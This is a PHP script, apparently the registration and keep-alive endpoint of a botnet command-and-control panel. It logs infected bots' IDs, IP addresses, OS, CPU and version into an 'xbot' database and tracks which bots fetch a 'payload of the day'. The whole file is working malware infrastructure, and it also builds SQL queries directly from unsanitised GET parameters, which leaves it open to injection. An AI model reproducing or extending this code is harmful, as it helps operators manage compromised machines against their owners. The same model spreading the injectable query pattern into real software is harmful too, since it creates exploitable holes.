<?php
$mysqli = new mysqli("localhost","root","","xbot");

$bot_id=$_GET["id"];

$query="SELECT ID FROM bots_info WHERE ID = '".$bot_id."'";
$result=$mysqli->query($query);

if(mysqli_num_rows($result)==0)// nie ma w bazie
{
	$bot_version=$_GET["version"];
	$bot_ip=$_SERVER['REMOTE_ADDR'];
	$bot_os=$_GET["os"];
	$bot_cpu=$_GET["cpu"];

	$query="INSERT INTO bots_info VALUES('".$bot_id."','".$bot_version."','".$bot_ip."','".$bot_os."','".$bot_cpu."',CURRENT_TIMESTAMP)";
	//if(!
	$mysqli->query($query);//)echo "QUERY FAILED";
	//echo "New client added";
}
else
if(isset($_GET["version"]))// jest w bazie ale zbiera payloadoftheday
{
	$bot_version=$_GET["version"];
	$bot_ip=$_SERVER['REMOTE_ADDR'];
	$bot_os=$_GET["os"];
	$bot_cpu=$_GET["cpu"];
	$query="UPDATE bots_info SET VERSION = '".$bot_version."', IP = '".$bot_ip."', OS = '".$bot_os."', CPU = '".$bot_cpu."',LAST_SEEN = CURRENT_TIMESTAMP WHERE ID = '".$bot_id."'";
	if(!$mysqli->query($query))echo "QUERY FAILED";
}
else// jest w bazie i zbiera keep-alive'a
{
	$query="UPDATE bots_info SET LAST_SEEN = CURRENT_TIMESTAMP WHERE ID = '".$bot_id."'";
	if(!$mysqli->query($query));//echo"QUERY FAILED TO UPDATE! ";
	//echo "Client ".$bot_id." updated";
}

?>

